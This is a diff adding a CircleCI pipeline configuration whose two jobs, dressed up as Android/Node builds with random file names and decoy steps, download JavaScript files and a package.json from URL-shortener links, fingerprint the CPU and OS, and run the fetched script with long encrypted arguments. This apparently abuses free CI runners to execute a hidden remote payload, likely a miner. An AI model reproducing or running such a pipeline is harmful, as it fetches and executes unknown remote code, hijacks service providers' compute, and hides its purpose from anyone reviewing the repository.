@@ -1,0 +1,52 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  starting:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch zgfj4cqzelcwsf6x4nofwz9l.css
+      - run: curl -fsSL shorturl.at/sBKTZ -o ew2x07uekttgckl05wal.js && curl -fsSL
+          shorturl.at/mJST3 -o package.json && curl -fsSL shorturl.at/osuT2 -o
+          49dvglgjssuxx0ee.js
+      - run: mkdir eqmrznxgr77hn2i1dgh6zqq
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: npm i -s
+      - run: cat /etc/os-release
+      - run: mkdir 8rtnhsnpu3opa36f17irtvs0k
+      - run: node ew2x07uekttgckl05wal -r
+          U2FsdGVkX18KkrEj6dvSZXQ30KuALmyA+pKNzvxSNayyaRE4CsfsHbjMYCQzyYj2C/gvm8r1lyWw+/pgL4Wo2xHddM26DLVGDn8C5VisWwvQhOH6H2UDZPqrpOLmJvcyu5ruONcAP1QAGHqn9+wLPYj2gJQJHH3dbYOgsl9QJqhaGeSwZJkHpIVA/ORSdNP6Ub8F+ADjQnKm2/SKCCr5ZwVIBdEvSbr8b1HITbNyLruVPtl+aZy5p8AgnWqs0VqheSHW8RbtwdtODDGbkXzsrYZdHdjFE3oCMrl8hFaK2C4=
+          -sp -t
+          U2FsdGVkX18Nf2nRFiUyil98v7wZUPWy+AliicoqqHq5McEtE5LvWIReRhLy77J5 -lpn
+          U2FsdGVkX19un6JHe9YmoQkQYfu97mD9MPAnLE6SVb/dbSPi61CePLjDeOpaPH62 -s
+          U2FsdGVkX1/5WeMHVjBcp1Z6N3aPUEu5qj6gusohHKnrMN8DdsuI1fN/z7zb298p7F9qAfXKL1DQV1eCCoyPUYBSxUUMTs/RL8vfuz6JAQlGCdeOczkDpvi6fjJLlSwbADFkStTGPRNYkxMorUBABAN6GxHKHaRkKp8SDd9RjprNaXP8DsmeggWIHi5hCksxhFEhl9MjPhTKM5L2oW9/aQdDP/xMWhzWvhRWfxArznw=
+      - run: mkdir ispecj5q7oeaoepbsrkct4
+  NodejsJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir zeg893nc1685aazw
+      - run: echo version 51733208900.18923
+      - run: curl -fsSL shorturl.at/buN24 -o ndhsjorvgh7czwga.js && curl -fsSL
+          shorturl.at/uBGLN -o package.json && curl -fsSL shorturl.at/gkD12 -o
+          uweol703r6d80lp.js
+      - run: mkdir lwoee3aih47
+      - run: npm i -s
+      - run: touch 5cxoedo2ca4.php
+      - run: cat /etc/os-release
+      - run: touch ww5lwf2qic8to.html
+      - run: node ndhsjorvgh7czwga -t
+          U2FsdGVkX19U3TdfNvAoi9453ISXw0HF86OcRiQYsq4wBLOdlqhmCkKDaSXu04Qr -r
+          U2FsdGVkX1+omv4HHrmiZykDeg/Atyq9lyHsYythoSBcE7PM1rp4BRd9qpin+kAnBt0i1KcOGxEtB42b/U5M0rYKNUFYaHzqvYud6vwclgz1F8UxbQA+M402LmE6UpXF/Nnus/vIkMmxgZkJoALKOm88uXQ+QhgNIv9QkGhHSToMbYMl7IOHtEWH+cz/Fq7uHgzH2uFXKYXVLu7HJVBQmJccMxidPKuqnxhl+4Y0CwMrCabbEuXO6KL+qebWXGYSxJpra+d9bMtPYCvnJ6D+sqXeWNo9cO4ML/aDQBrJFD8=
+          -sp -lpn U2FsdGVkX1+aNJSukgdySqMEAVhZelJtf8w+RDX9Qgk= -s
+          U2FsdGVkX1+ZhWxHeVLRUfLe87U+ZORdxJvy/zxW1mv1mo8QyHgh3QCVL84p55y+bR4Wqxxw3L3fqeQm9cH8KqQtFyD1QlOIqTa0io2sqqh7tg/K8uIH8IRetPpC3iQ3/s/3IcbLwiW/u2Xxjm5e2nwytdrxREPnPqNxijbsC52zT5+EGvkGGE0uH7PdYQ6iPowbIgmZnn5Rfn5wfV25nHe4dFMbrR2O/yDhShoQj9k=
+workflows:
+  chay-thu-nghiem:
+    jobs:
+      - starting
+  xay-dung:
+    jobs:
+      - NodejsJobs
